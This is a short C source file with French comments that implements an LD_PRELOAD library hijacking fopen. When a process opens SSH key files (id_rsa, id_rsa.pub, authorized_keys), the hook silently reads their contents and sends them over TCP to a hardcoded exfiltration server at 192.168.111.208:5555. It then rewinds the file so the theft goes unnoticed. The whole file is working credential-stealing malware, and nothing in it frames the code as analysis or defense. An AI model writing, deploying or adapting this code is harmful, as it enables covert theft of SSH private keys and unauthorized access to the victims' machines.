#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define EXFIL_SERVER "192.168.111.208"  // Adresse IP du serveur d'exfiltration
#define EXFIL_PORT 5555

static FILE *(*original_fopen)(const char *pathname, const char *mode) = NULL;

void send_to_exfil_server(const char *data, size_t len) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(EXFIL_PORT);
    inet_pton(AF_INET, EXFIL_SERVER, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
        send(sock, data, len, 0);
    }
    close(sock);
}

FILE *fopen(const char *pathname, const char *mode) {
    if (!original_fopen) original_fopen = dlsym(RTLD_NEXT, "fopen");

    if (strstr(pathname, ".ssh/id_rsa") || strstr(pathname, ".ssh/id_rsa.pub") ||
        strstr(pathname, ".ssh/authorized_keys")) {
        
        FILE *fp = original_fopen(pathname, mode);
        if (!fp) return NULL;

        char buffer[4096];
        size_t bytes_read = fread(buffer, 1, sizeof(buffer), fp);
        if (bytes_read > 0) {
            send_to_exfil_server(buffer, bytes_read);
        }

        rewind(fp);  // Permet au vrai processus de lire normalement
        return fp;
    }

    return original_fopen(pathname, mode);
}